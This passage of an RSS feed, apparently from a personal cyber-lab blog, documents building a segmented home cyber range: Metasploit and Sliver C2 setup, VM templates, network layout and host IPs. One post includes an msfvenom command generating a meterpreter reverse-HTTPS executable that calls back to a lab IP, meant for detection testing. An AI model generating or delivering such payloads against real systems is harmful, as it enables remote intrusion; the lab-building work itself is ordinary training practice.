&lt;h2 id="-installation-steps">🛠️ Installation Steps&lt;/h2>
&lt;h3 id="1-download">1. Download&lt;/h3>
&lt;p>From a system with internet access:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>Invoke-WebRequest -Uri &lt;span style="color:#e6db74">&amp;#34;https://download.sysinternals.com/files/SysinternalsSuite.zip&amp;#34;&lt;/span> -OutFile &lt;span style="color:#e6db74">&amp;#34;SysinternalsSuite.zip&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="2-transfer-and-install">2. Transfer and Install&lt;/h3>
&lt;p>Copy the zip to &lt;code>C:\OPFORGE\SysinternalsSuite.zip&lt;/code>, then run:&lt;/p></description></item><item><title>OPF-RED01 Metasploit Setup &amp; Payload Generation</title><link>https://opforge.dev/posts/2025-05-26-opf-red01-metasploit-setup/</link><pubDate>Mon, 26 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-26-opf-red01-metasploit-setup/</guid><description>&lt;h2 id="metasploit-installed">Metasploit Installed&lt;/h2>
&lt;p>Metasploit was installed using the official &lt;code>msfinstall&lt;/code> script:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#ae81ff">755&lt;/span> msfinstall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo ./msfinstall
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Confirmed with:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfconsole --version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="payload-generation">Payload Generation&lt;/h2>
&lt;p>The following payload was created for C2 operations within the DMZRED segment:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>sudo msfvenom -p windows/x64/meterpreter/reverse_https &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> LHOST&lt;span style="color:#f92672">=&lt;/span>192.168.22.50 LPORT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8443&lt;/span> &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -f exe -o shell.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Payload was moved to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>/opt/opforge/redteam/payloads/shell.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>File properties:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>file shell.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sha256sum shell.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.&lt;/p></description></item><item><title>OPF-RED01 Sliver Server Setup</title><link>https://opforge.dev/posts/2025-05-26-opf-red01-sliver-setup/</link><pubDate>Mon, 26 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-26-opf-red01-sliver-setup/</guid><description>&lt;h2 id="sliver-build--launch">Sliver Build &amp;amp; Launch&lt;/h2>
&lt;p>After cloning the Sliver repository and resolving build prerequisites (notably &lt;code>zip&lt;/code>), the server was compiled successfully using:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cd /opt/opforge/tools/sliver
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The Sliver server was then launched:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./sliver-server
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="screenshot-of-successful-launch">Screenshot of Successful Launch&lt;/h2>
&lt;p>&lt;img alt="Sliver Server Launch" loading="lazy" src="https://opforge.dev/images/posts/sliver-server-launch.png">&lt;/p>
&lt;p>This confirms the Sliver C2 is operational and ready to receive implants or generate payloads.&lt;/p>
&lt;hr>
&lt;h2 id="next-steps">Next Steps&lt;/h2>
&lt;ul>
&lt;li>Launch &lt;code>sliver-client&lt;/code> and test C2 communication&lt;/li>
&lt;li>Generate staged and unstaged payloads&lt;/li>
&lt;li>Begin Red Team activity with Sliver in DMZRED&lt;/li>
&lt;li>Monitor OPF-BLUE01/AI01 for correlated events&lt;/li>
&lt;/ul></description></item><item><title>Building Hardened Base Templates for Red, Blue, and AI VMs in OPFORGE</title><link>https://opforge.dev/posts/2024-05-25-opforge-template-builds/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2024-05-25-opforge-template-builds/</guid><description>&lt;h2 id="base-ubuntu-2204-template">base-ubuntu-2204-template&lt;/h2>
&lt;ul>
&lt;li>OS: Ubuntu 22.04 LTS Minimal&lt;/li>
&lt;li>Uses: Cloning source for &lt;code>opf-red01&lt;/code>, &lt;code>opf-log01&lt;/code>, &lt;code>opf-ai01&lt;/code>, &lt;code>opf-cloud01&lt;/code>&lt;/li>
&lt;li>Hardened baseline with:
&lt;ul>
&lt;li>UFW firewall&lt;/li>
&lt;li>SSH key-based auth&lt;/li>
&lt;li>Git, Python, pip pre-installed&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Snapshot name: &lt;code>Clean Install – Ready for Clone&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="base-windows10-template">base-windows10-template&lt;/h2>
&lt;ul>
&lt;li>OS: Windows 10 Pro 22H2 (fully patched)&lt;/li>
&lt;li>Uses: Cloning source for &lt;code>opf-mbr01&lt;/code>, future victims&lt;/li>
&lt;li>Tools installed via Chocolatey:
&lt;ul>
&lt;li>Sysmon, Winlogbeat, VSCode, Wireshark, Sysinternals&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Pre-Sysprep and snapshot-ready&lt;/li>
&lt;/ul></description></item><item><title>Designing a Segmented Cyber Lab: OPFORGE Network Architecture</title><link>https://opforge.dev/posts/2024-05-25-opforge-network-design/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2024-05-25-opforge-network-design/</guid><description>&lt;h2 id="segments">Segments&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>CSOCINFRA (192.168.20.0/24)&lt;/strong>: Houses &lt;code>opf-log01&lt;/code> (SIEM) and &lt;code>opf-ai01&lt;/code> (ML detection)&lt;/li>
&lt;li>&lt;strong>LANWORKSTATIONS (192.168.30.0/24)&lt;/strong>: Contains &lt;code>opf-mbr01&lt;/code> and future endpoints&lt;/li>
&lt;li>&lt;strong>DMZRED (192.168.22.0/24)&lt;/strong>: Hosts attacker targets like &lt;code>opf-cloud01&lt;/code>&lt;/li>
&lt;li>&lt;strong>ADINFRA (192.168.40.0/24)&lt;/strong>: Supports &lt;code>opf-dc01&lt;/code> and GPO testing&lt;/li>
&lt;/ul>
&lt;h2 id="example-host-assignments">Example Host Assignments&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Host&lt;/th>
&lt;th>IP Address&lt;/th>
&lt;th>Segment&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>opf-fw01&lt;/td>
&lt;td>192.168.1.24 (WAN)&lt;/td>
&lt;td>pfSense router&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-dc01&lt;/td>
&lt;td>192.168.40.100&lt;/td>
&lt;td>ADINFRA&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-mbr01&lt;/td>
&lt;td>192.168.30.101&lt;/td>
&lt;td>LANWORKSTATIONS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-red01&lt;/td>
&lt;td>192.168.22.50&lt;/td>
&lt;td>DMZRED&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-log01&lt;/td>
&lt;td>192.168.20.12&lt;/td>
&lt;td>CSOCINFRA&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></description></item><item><title>From Sandbox to Cyber Range: How OPFORGE Evolved into a Professional Portfolio Lab</title><link>https://opforge.dev/posts/2024-05-25-opforge-infra-evolution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2024-05-25-opforge-infra-evolution/</guid><description>&lt;p>OPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.&lt;/p>
&lt;h2 id="evolution-timeline">Evolution Timeline&lt;/h2>
&lt;h3 id="phase-1-initial-sandbox">Phase 1: Initial Sandbox&lt;/h3>
&lt;ul>
&lt;li>Single VM (SOF-ELK)&lt;/li>
&lt;li>Flat network, no segmentation&lt;/li>
&lt;li>Manual log ingestion&lt;/li>
&lt;/ul>
&lt;h3 id="phase-2-tactical-expansion">Phase 2: Tactical Expansion&lt;/h3>
&lt;ul>
&lt;li>Added pfSense (&lt;code>opf-fw01&lt;/code>)&lt;/li>
&lt;li>Introduced segmentation: &lt;code>CSOCINFRA&lt;/code>, &lt;code>DMZRED&lt;/code>, &lt;code>LANWORKSTATIONS&lt;/code>, &lt;code>ADINFRA&lt;/code>&lt;/li>
&lt;li>First red team emulation with &lt;code>opf-red01&lt;/code>&lt;/li>
&lt;li>Winlogbeat and Sysmon on endpoints&lt;/li>
&lt;/ul>
&lt;h3 id="phase-3-professionalization">Phase 3: Professionalization&lt;/h3>
&lt;ul>
&lt;li>Cloned base templates (&lt;code>base-ubuntu-2204-template&lt;/code>, &lt;code>base-windows10-template&lt;/code>)&lt;/li>
&lt;li>VM-specific roles: &lt;code>opf-ai01&lt;/code>, &lt;code>opf-log01&lt;/code>, &lt;code>opf-mbr01&lt;/code>, etc.&lt;/li>
&lt;li>AI and ML integration via Jupyter (&lt;code>opf-ai01&lt;/code>)&lt;/li>
&lt;li>Multi-tiered ingest pipeline (Zeek → Logstash → OpenSearch)&lt;/li>
&lt;/ul>
&lt;h2 id="lessons-learned">Lessons Learned&lt;/h2>
&lt;ul>
&lt;li>Legacy OS images break modern tools&lt;/li>
&lt;li>Cloning base templates improves consistency&lt;/li>
&lt;li>Network segmentation is essential for realistic detection engineering&lt;/li>
&lt;/ul></description></item><item><title>OPFORGE Base Template Notes</title><link>https://opforge.dev/posts/opf-template-notes/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opf-template-notes/</guid><description>&lt;h2 id="-base-templates-used-in-opforge">🧱 Base Templates Used in OPFORGE&lt;/h2>
&lt;p>This post outlines the two core VM templates used to clone all OPFORGE lab components. Each template is hardened, snapshot-ready, and optimized for its role.&lt;/p>
&lt;hr>
&lt;h3 id="-base-ubuntu-2204-template">🐧 &lt;code>base-ubuntu-2204-template&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 22.04 LTS (minimal ISO)&lt;/li>
&lt;li>&lt;strong>Usage&lt;/strong>: Source image for all Linux-based OPFORGE components&lt;/li>
&lt;li>&lt;strong>Configured With&lt;/strong>:
&lt;ul>
&lt;li>SSH key-based authentication&lt;/li>
&lt;li>&lt;code>ufw&lt;/code> firewall rules&lt;/li>
&lt;li>Preinstalled: Git, Python3, pip, htop, curl, net-tools&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Snapshot Label&lt;/strong>: &lt;code>ubuntu2204-clean-template&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="-base-windows10-template">🪟 &lt;code>base-windows10-template&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Windows 10 Pro 22H2 (fully patched)&lt;/li>
&lt;li>&lt;strong>Usage&lt;/strong>: Source image for domain-joined endpoints&lt;/li>
&lt;li>&lt;strong>Configured With&lt;/strong>:
&lt;ul>
&lt;li>Tools installed via &lt;code>Install-OPFORGE-WindowsTools.ps1&lt;/code>:
&lt;ul>
&lt;li>Sysmon, Winlogbeat, 7zip, VSCode, Sysinternals, Wireshark&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Bloatware removal and telemetry disabled&lt;/li>
&lt;li>Power settings and Start menu cleaned&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Snapshot Label&lt;/strong>: &lt;code>win10_22H2_tools_installed&lt;/code>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>Both templates are used to ensure consistency, repeatability, and portfolio-quality documentation across the OPFORGE environment.&lt;/p></description></item><item><title>OPFORGE Infrastructure Overview</title><link>https://opforge.dev/docs/opf-infra/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/docs/opf-infra/</guid><description>&lt;h1 id="opforge-infrastructure-overview">OPFORGE Infrastructure Overview&lt;/h1>
&lt;h2 id="overview">Overview&lt;/h2>
&lt;p>OPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.&lt;/p>
&lt;h2 id="evolution-timeline">Evolution Timeline&lt;/h2>
&lt;h3 id="phase-1-initial-sandbox">Phase 1: Initial Sandbox&lt;/h3>
&lt;ul>
&lt;li>Single VM (SOF-ELK)&lt;/li>
&lt;li>Flat network, no segmentation&lt;/li>
&lt;li>Manual log ingestion&lt;/li>
&lt;/ul>
&lt;h3 id="phase-2-tactical-expansion">Phase 2: Tactical Expansion&lt;/h3>
&lt;ul>
&lt;li>Added pfSense (&lt;code>opf-fw01&lt;/code>)&lt;/li>
&lt;li>Introduced segmentation: &lt;code>CSOCINFRA&lt;/code>, &lt;code>DMZRED&lt;/code>, &lt;code>LANWORKSTATIONS&lt;/code>, &lt;code>ADINFRA&lt;/code>&lt;/li>
&lt;li>First red team emulation with &lt;code>opf-red01&lt;/code>&lt;/li>
&lt;li>Winlogbeat and Sysmon on endpoints&lt;/li>
&lt;/ul>
&lt;h3 id="phase-3-professionalization">Phase 3: Professionalization&lt;/h3>
&lt;ul>
&lt;li>Cloned base templates (&lt;code>base-ubuntu-2204-template&lt;/code>, &lt;code>base-windows10-template&lt;/code>)&lt;/li>
&lt;li>VM-specific roles: &lt;code>opf-ai01&lt;/code>, &lt;code>opf-log01&lt;/code>, &lt;code>opf-mbr01&lt;/code>, etc.&lt;/li>
&lt;li>AI and ML integration via Jupyter (&lt;code>opf-ai01&lt;/code>)&lt;/li>
&lt;li>Multi-tiered ingest pipeline (Zeek → Logstash → OpenSearch)&lt;/li>
&lt;/ul>
&lt;h2 id="lessons-learned">Lessons Learned&lt;/h2>
&lt;ul>
&lt;li>Legacy OS images break modern tools&lt;/li>
&lt;li>Cloning base templates improves consistency&lt;/li>
&lt;li>Network segmentation is essential for realistic detection engineering&lt;/li>
&lt;/ul></description></item><item><title>OPFORGE Network Layout</title><link>https://opforge.dev/docs/opf-network-layout/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/docs/opf-network-layout/</guid><description>&lt;h1 id="opforge-network-layout">OPFORGE Network Layout&lt;/h1>
&lt;h2 id="segments">Segments&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>CSOCINFRA (192.168.20.0/24)&lt;/strong>: Houses &lt;code>opf-log01&lt;/code> (SIEM) and &lt;code>opf-ai01&lt;/code> (ML detection)&lt;/li>
&lt;li>&lt;strong>LANWORKSTATIONS (192.168.30.0/24)&lt;/strong>: Contains &lt;code>opf-mbr01&lt;/code> and future endpoints&lt;/li>
&lt;li>&lt;strong>DMZRED (192.168.22.0/24)&lt;/strong>: Hosts attacker targets like &lt;code>opf-cloud01&lt;/code>&lt;/li>
&lt;li>&lt;strong>ADINFRA (192.168.40.0/24)&lt;/strong>: Supports &lt;code>opf-dc01&lt;/code> and GPO testing&lt;/li>
&lt;/ul>
&lt;h2 id="example-host-assignments">Example Host Assignments&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Host&lt;/th>
&lt;th>IP Address&lt;/th>
&lt;th>Segment&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>opf-fw01&lt;/td>
&lt;td>192.168.1.24 (WAN)&lt;/td>
&lt;td>pfSense router&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-dc01&lt;/td>
&lt;td>192.168.40.100&lt;/td>
&lt;td>ADINFRA&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-mbr01&lt;/td>
&lt;td>192.168.30.101&lt;/td>
&lt;td>LANWORKSTATIONS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-red01&lt;/td>
&lt;td>192.168.22.50&lt;/td>
&lt;td>DMZRED&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-log01&lt;/td>
&lt;td>192.168.20.12&lt;/td>
&lt;td>CSOCINFRA&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></description></item><item><title>OPFORGE VM Clone Map</title><link>https://opforge.dev/posts/opf-clone-map/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opf-clone-map/</guid><description>&lt;h2 id="-cloned-vms-in-the-opforge-lab">🔁 Cloned VMs in the OPFORGE Lab&lt;/h2>
&lt;p>The following VMs are derived from the base templates and customized for their operational roles.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Template&lt;/th>
&lt;th>Clone&lt;/th>
&lt;th>Role Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>&lt;code>opf-red01&lt;/code>&lt;/td>
&lt;td>Red Team operator + C2 lab&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>&lt;code>opf-log01&lt;/code>&lt;/td>
&lt;td>Log ingestion + OpenSearch stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>&lt;code>opf-ai01&lt;/code>&lt;/td>
&lt;td>ML/AI detection modeling&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>&lt;code>opf-cloud01&lt;/code>&lt;/td>
&lt;td>Web app target in DMZRED&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-windows10-template&lt;/td>
&lt;td>&lt;code>opf-mbr01&lt;/code>&lt;/td>
&lt;td>Domain-joined endpoint (Win10)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="-notes">🧠 Notes&lt;/h2>
&lt;ul>
&lt;li>Hostnames and static IPs are applied per segment&lt;/li>
&lt;li>Each VM is configured with dedicated virtual NICs&lt;/li>
&lt;li>Cloning process preserves snapshot state and configuration integrity&lt;/li>
&lt;/ul></description></item><item><title>Scaling OPFORGE: How I Clone and Manage Cyber Range VMs</title><link>https://opforge.dev/posts/2024-05-25-opforge-vm-cloning/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2024-05-25-opforge-vm-cloning/</guid><description>&lt;h2 id="clone-map">Clone Map&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Template&lt;/th>
&lt;th>Clone Name&lt;/th>
&lt;th>Purpose&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>opf-red01&lt;/td>
&lt;td>Red Team operator box&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>opf-log01&lt;/td>
&lt;td>Log pipeline (Zeek, OpenSearch)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>opf-ai01&lt;/td>
&lt;td>Jupyter + anomaly detection&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>opf-cloud01&lt;/td>
&lt;td>Targeted web app for attack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-windows10-template&lt;/td>
&lt;td>opf-mbr01&lt;/td>
&lt;td>Domain-joined endpoint&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="lessons-learned">Lessons Learned&lt;/h2>
&lt;ul>
&lt;li>Clone from snapshot, then personalize (hostname, NIC, IP)&lt;/li>
&lt;li>Use base templates with all dependencies pre-installed&lt;/li>
&lt;li>Maintain consistency across VM builds using scripting and snapshots&lt;/li>
&lt;/ul></description></item><item><title>Windows 10 Template Setup for OPFORGE</title><link>https://opforge.dev/posts/windows-setup/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/windows-setup/</guid><description>&lt;p>This post documents the process of building and finalizing the &lt;strong>Windows 10 Pro 22H2&lt;/strong> template for use in the OPFORGE cyber lab environment.&lt;/p>
&lt;h2 id="-version--baseline">🛠️ Version &amp;amp; Baseline&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Windows 10 Pro 22H2 (fully patched as of 2025-05-25)&lt;/li>
&lt;li>&lt;strong>Build Source&lt;/strong>: Clean ISO install (22H2), upgraded from legacy 10240&lt;/li>
&lt;li>&lt;strong>Purpose&lt;/strong>: Golden template for domain-joined endpoint clones (&lt;code>opf-mbr01&lt;/code>, future victim hosts)&lt;/li>
&lt;/ul>
&lt;h2 id="-tool-installation-via-script">📦 Tool Installation via Script&lt;/h2>
&lt;p>After installation and patching, the following tools were installed using the custom script:&lt;/p></description></item></channel></rss>